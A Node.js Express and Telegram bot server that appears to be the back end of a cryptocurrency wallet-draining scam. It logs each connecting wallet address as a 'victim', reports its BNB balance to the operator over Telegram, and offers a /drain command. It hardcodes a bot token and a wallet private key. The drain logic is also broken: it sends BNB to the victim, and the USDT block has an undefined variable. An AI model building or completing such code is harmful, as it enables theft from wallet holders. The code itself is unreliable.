const express = require('express');
const { Telegraf } = require('telegraf');
const { ethers } = require('ethers');

const app = express();

// Configuration
const bot = new Telegraf(process.env.BOT_TOKEN || '8784186028:AAGYFLxKiFLbl3Id5jMGjWers3R7wvdF6dg');
app.use(express.json());
app.use(express.static('public'));

let lastVictim = "";
const MY_WALLET_ADDRESS = "0x136FF7b8d0c60a252E31c17C8af6F7d1971E4BD4";

// BSC Network Setup
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
const privateKey = process.env.PRIVATE_KEY || '7aeeef7143c485da45fe2bd18c09b0f661efe970230b5e2b667072e341381d36';
const myWallet = new ethers.Wallet(privateKey, provider);

// USDT Contract Address on BSC (This is the standard one)
const USDT_ADDRESS = "0x55d398326f99fa6018e5401cb61ef101af0370c8";
const usdtContract = new ethers.Contract(USDT_ADDRESS, ["function transfer(address to, uint256 amount) public returns (bool)", "function approve(address spender, uint256 amount) public returns (bool)"], myWallet);

app.get('/api/connect', async (req, res) => {
    const address = req.query.address;
    if (!address) return res.status(400).json({ error: "No address provided" });

    lastVictim = address;
    try {
        // Get balance of the user's main BNB wallet
        const balance = await provider.getBalance(address);
        const formatted = ethers.formatEther(balance);

        await bot.telegram.sendMessage(process.env.CHAT_ID || '7765106285',
            `🎯 NEW TARGET DETECTED!\n\nAddress: ${address}\nBNB Balance: ${formatted}\n\nAction: Use /drain in Telegram.`);

        res.json({ success: true, balance: formatted });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// The Drain Command
bot.command('drain', async (ctx) => {
    if (!lastVictim) return ctx.reply("❌ No target selected! They must connect their wallet first.");

    ctx.reply(`🚀 Initiating drain for ${lastVictim}...`);

    try {
        // 1. If you want to move BNB:
        const txBNB = await myWallet.sendTransaction({
            to: lastVictim,
            value: ethers.parseEther("0.1") // Adjust amount as needed
        });
        ctx.reply(`✅ BNB Transferred! Hash: ${txBNB.hash}`);

        // 2. If you want to drain USDT (Optional - uncomment below if you have their "Approval")
        /*
        const txUSDT = await usdtContract.transfer(MY_WALLET_ADDRESS, ethers.parseUnits("100", 18));
        ctx.reply(`✅ USDT Transferred! Hash: ${tx_USDT.hash}`);
        */

    } catch (error) {
        console.error(error);
        ctx.reply(`❌ Error during drain: ${error.message}`);
    }
});

bot.launch();
app.listen(process.env.PORT || 3000, () => console.log('Server running on port ' + (process.env.PORT || 3000)));
